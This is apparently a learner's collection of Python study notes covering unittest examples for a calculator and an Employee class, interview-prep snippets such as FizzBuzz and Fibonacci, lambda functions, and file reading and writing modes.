    # The setUp() and tearDown() methods allow you to define instructions that will be executed before and after each test method.
    # using python test_calc.py does not show any output
    # but python -m unittest test_calc.py shows output
    # to by pass this we can use the __name__ == "__main__"
    # you may check for edge cases



class TestCalc(unittest.TestCase):    
    def test_add(self):
        self.assertEqual(calc.add(10,5), 15)                # to test the two args, Pass if equal, Fails if not equal (throws an Assertion error)
        self.assertEqual(calc.add(-1,1), 0)
        self.assertEqual(calc.add(-1,-1),-2)
    
    def test_subtract(self):
        self.assertEqual(calc.subtract(10, 5), 5)
        self.assertEqual(calc.subtract(-1, 1), -2)
        self.assertEqual(calc.subtract(-1, -1), 0)

    def test_multiply(self):
        self.assertEqual(calc.multiply(10, 5), 50)
        self.assertEqual(calc.multiply(-1, 1), -1)
        self.assertEqual(calc.multiply(-1, -1), 1)

    def test_divide(self):
        self.assertEqual(calc.divide(10, 5), 2)
        self.assertEqual(calc.divide(-1, 1), -1)
        self.assertEqual(calc.divide(-1, -1), 1)
        self.assertEqual(calc.divide(5, 2), 2.5)


        self.assertRaises(ValueError, calc.divide, 10, 0)      # first arg is the exception we expect, second is the function we want to run but we are not passing args to the func(so we leave out the paranthesis)
        
        with self.assertRaises(ValueError):                    # the context manager makes it possible to handle and check the exception properly and also call our function normally
            calc.divide(10, 0)

if __name__ = "__main__":                 # if we ran this module correctly, then run the code with this condition (unittest.main()) p it runs it all
    unittest.main()


#--------> employee.py
class Employee:
    """A sample Employee class"""

    raise_amt = 1.05

    def __init__(self, first, last, pay):                           # to creat an instance of employeee
        self.first = first
        self.last = last
        self.pay = pay

    @property
    def email(self):                                                # method that retruns the employee email address
        return '{}.{}@email.com'.format(self.first, self.last)

    @property
    def fullname(self):                                             # method that returns the employee fullname
        return '{} {}'.format(self.first, self.last)

    def apply_raise(self):                                          # apply raise
        self.pay = int(self.pay * self.raise_amt)

    def monthly_schedule(self, month):
        response = requests.get(f'http://company.com/{self.last}/{month}')
        if response.ok:
            return response.text
        else:
            return 'Bad Response!'

------------------------------------------------------
class TestEmployee(unittest.TestCase):
    def test_email(self):
        
        emp_1 = Employee('Corey','Schafer', 50000)
        emp_2 = Employee('Sue', 'Smith', 60000)

        self.assertEqual(emp_1.email, 'Corey.Schafer@email.com')                  # checkig their email
        self.assertEqual(emp_2.email, 'Sue.Smith@email.com')

        emp_1.first = 'John'
        emp_2.first = 'Jane'

        self.assertEqual(emp_1.email, 'John.Schafer@email.com')                    # change name and check their email
        self.assertEqual(emp_2.email, 'Jane.Smith@email.com')

    def test_fullname(self):
        emp_1 = Employee('Corey','Schafer', 50000)
        emp_2 = Employee('Sue', 'Smith', 60000)

        self.assertEqual(emp_1.fullname, 'Corey Schafer')
        self.assertEqual(emp_2.fullname, 'Sue Smith')

        emp_1.first = 'John'
        emp_2.first = 'Jane'

        self.assertEqual(emp_1.fullname, 'John Schafer')
        self.assertEqual(emp_2.fullname, 'Jane Smith')

    def test_apply_raise(self):
        emp_1 = Employee('Corey','Schafer', 50000)               # create an instance of employee 
        emp_2 = Employee('Sue', 'Smith', 60000)

        emp_1.apply_raise()                                 # apply a 5% raise
        emp_2.apply_raise()

        self.assertEqual(emp_1.pay, 52500)                  # check if its equal
        self.assertEqual(emp_2.pay, 63000)

if __name__ == '__main__':
    unittest.main()

--------------------------------------------------------------------------------------


> setupClass
setUp
test_apply_raise
.tearDown
#####Preparing for Python Interview
#1. HOW TO WRITE CODE ON WHITEBOARD OR PAPER 
#how to use for loop to loop through range of numbers
for i in range(1,11):
	print(i)
	
#using while loop
i=1
while i <= 10:
	print(i)
	i += 1
#2.KNOW BASIC PYTHON CONTROL FLOW
a =10
b = 20
if a<b:
	print( "{} is less than {}".format(a,b))
elif a == 20 :
	print( "{} is equal to {}".format(a,b))
else:
	print( "{} is greater than {}".format(a,b))

#3. ABLE TO DISCUSS HOW YOU'VE USED PYTHON
- a web scraping project
- a program for system task, display system usage

import os, glob

os.chdir("/Users/HP.DESKTOP-MVC2C5I/Pictures")      #changing directory
for file in glob.glob("*.jpg"):                     #look through file system
	print(file)                                 #return file
	
#4. KNOW HOW TO SOLVE COMMON INTERIEW PROBLEMS
# fIZZ bUzz
for num in range(1,101):
	if num % 5 == 0 and num % 3 ==0:
		print("FizzBuzz")
	elif num % 3 == 0:
		print("Fizz")
	elif num % 5 == 0:
		print("Buzz")
	else:
		print(num)
		
#fibonacci Sequence
a, b = 0, 1

for i in range(0,10):
	print(a)
	a, b =b, a+b


[Pyhton Questions](https://bidsarmanish.blogspot.com/2017/10/python-interview-questions-2.html)

#10. KNOW THE BASICS OF OTHER TECHNOLOGIES 
#T-shaped profesional model is a metaphor used in job recruitment to describe the abilities of persons in the workforce. 
#The vertical bar on the letter T represents the DEPTH of related skills and expertise in a single field, 
#whereas the horizontal bar(BREADTH) is the ability to collaborate across disciplines with experts in other areas and to apply knowledge in areas of expertise other than one's own.

#


==================================================
lambda
==================================================

# A lambda function is a small anonymous function.

# A lambda function can take any number of arguments, but can only have one expression.

# lambda arguments : expression

x = lambda a : a + 10
print(x(5))
> 15

# Lambda functions can take any number of arguments:

x = lambda a, b, c : a + b + c
print(x(5, 6, 2))
 > 13

# The power of lambda is better shown when you use them as an anonymous function inside another function.

def myfunc(n):
  return lambda a : a * n

mydoubler = myfunc(2)

print(mydoubler(11))
> 22


==================================================
File Ojects - Readignand writing to Files
==================================================

Modes 
r              # Opens a file for reading only. The file pointer is placed at the beginning of the file. This is the default mode.
rb             # Opens a file for reading only in binary format. The file pointer is placed at the beginning of the file. This is the default mode.
r+             # Opens a file for both reading and writing. The file pointer placed at the beginning of the file.
rb+            # Opens a file for both reading and writing in binary format. The file pointer placed at the beginning of the file.
w              # Opens a file for writing only. Overwrites the file if the file exists. If the file does not exist, creates a new file for writing.	
wb             # Opens a file for writing only in binary format. Overwrites the file if the file exists. If the file does not exist, creates a new file for writing.	
w+             # Opens a file for both writing and reading. Overwrites the existing file if the file exists. If the file does not exist, creates a new file for reading and writing.
wb+            # Opens a file for both writing and reading in binary format. Overwrites the existing file if the file exists. If the file does not exist, creates a new file for reading and writing.	
a              # Opens a file for appending. The file pointer is at the end of the file if the file exists. That is, the file is in the append mode. If the file does not exist, it creates a new file for writing.	
ab     Opens a file for appending in binary format. The file pointer is at the end of the file if the file exists. That is, the file is in the append mode. If the file does not exist, it creates a new file for writing.	
a+      Opens a file for both appending and reading. The file pointer is at the end of the file if the file exists. The file opens in the append mode. If the file does not exist, it creates a new file for reading and writing.	
ab+     Opens a file for both appending and reading in binary format. The file pointer is at the end of the file if the file exists. The file opens in the append mode. If the file does not exist, it creates a new file for reading and writing.

f = open('test.txt', 'r')                       # using the input function

print(f.name)
print(f.mode)
f.close()                                        # to explicitly close the file

>test.txt
r	
	
with open('test.txt','r') as f :                 # using context manager
    pass

print(f.closed)
> True                      # Allow us to work with files with this block and after we exit that block of code or an Exception is thrown, it will automatically close the file and 

with open('test.txt','r') as f :   
    f_contents = f.read()
    print(f_contents)       # The read() method reads the entire content from an open file 

f.read(100)                 # returns first 100 characters of the file
f.readline()                # returns the first line of our file
f.readlines()               # returns a list of lines of the file 

with open('test.txt','r') as f :    
    for line in f:                      # this is efficient because it goes through and get one line at a time from the file; not reading all at once so its not a memory issue 
        print(line, end='')

##The Basics:
#f = open("test.txt", "r")
#f = open("test.txt", "w")
#f = open("test.txt", "a")
#f = open("test.txt", "r+")
#print(f.name)
#print(f.mode)
#f.close()

##Reading Files:
#with open("test.txt", "r") as f:
	#pass

	##Small Files:
	#f_contents = f.read()
	#print(f_contents)

	##Big Files:
	#f_contents = f.readlines()
	#print(f_contents)

    ###With the extra lines:
	#f_contents = f.readline()
	#print(f_contents)
	#f_contents = f.readline()
	#print(f_contents)

	###Without the extra lines:
	#f_contents = f.readline()
	#print(f_contents, end = '')
	#f_contents = f.readline()
	#print(f_contents, end = '')

	###Iterating through the file:
	#for line in f:
		#print(line, end = '')

	###Going Back....:
	#f_contents = f.read()
	#print(f_contents, end = '')

	###Printing by characters:
	#f_contents = f.read(100)
	#print(f_contents, end = '')
	#f_contents = f.read(100)
	#print(f_contents, end = '')
	#f_contents = f.read(100)
	#print(f_contents, end = '')

	###Iterating through small chunks:
	#size_to_read = 100
	#f_contents = f.read(size_to_read)
	#while len(f_contents) > 0:
		#print(f_contents)
		#f_contents = f.read(size_to_read)

	###Iterating through small chunks, with 10 characters:
	#size_to_read = 10
	#f_contents = f.read(size_to_read)
	#print(f_contents, end = '')
	#f.seek(0)
	#f_contents = f.read(size_to_read)
	#print(f_contents, end = '')
	#print(f.tell())
	#while len(f_contents) > 0:
		#print(f_contents, end = '*')
		#f_contents = f.read(size_to_read)
#print(f.mode)
#print(f.closed)
#print(f.read())


##Writing Files:
###The Error:
#with open("test.txt", "r") as f:
	#f.write("Test")

###Writing Starts:
#with open("test2.txt", "w") as f:
	#pass
	#f.write("Test")
	#f.seek(0)
	#f.write("Test")
	#f.seek("R")

##Copying Files:
#with open("test.txt", "r") as rf:
	#with open("test_copy.txt", "w") as wf:
		#for line in rf:
			#wf.write(line)

#Copying the/your image:
###The Error
#with open("bronx.jpg", "r") as rf:
	#with open("bronx_copy.jpg", "w") as wf:
		#for line in rf:
			#wf.write(line)

###Copying the image starts, without chunks:
#with open("bronx.jpg", "rb") as rf:
	#with open("bronx_copy.jpg", "wb") as wf:
		#for line in rf:
			#wf.write(line)

###Copying the image with chunks:
#with open("bronx.jpg", "rb") as rf:
	#with open("bronx_copy.jpg", "wb") as wf:
		#chunk_size = 4096
        #rf_chunk = rf.read(chunk_size)
        #while len(rf_chunk) > 0:
            #wf.write(rf_chunk)
            #rf_chunk = rf.read(chunk_size)












